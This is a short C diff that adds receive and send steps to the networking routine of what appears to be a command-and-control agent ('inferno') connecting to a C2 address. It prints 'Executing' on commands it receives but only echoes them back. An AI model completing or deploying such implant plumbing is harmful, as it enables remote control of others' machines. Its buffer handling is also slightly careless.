@@ -27,7 +27,17 @@ void networking() {
     //connect
     printf("Connecting...\n");
     int inferno_connect = connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
-    printf("Connected");
+    printf("Connected\n");
 
-    
+    //receive
+    char receive[1024];
+    printf("Receiving...\n");
+    int inferno_receive = recv(inferno_socket, receive, sizeof(receive), 0);
+    receive[strcspn(receive, "\n")] = '\0';
+    printf("Executing: %s\n", receive);
+
+    //send
+    printf("Sending: %s from agent...\n", receive);
+    ssize_t inferno_send = send(inferno_socket, receive, sizeof(receive), 0);    
+    printf("Sent\n");
 }
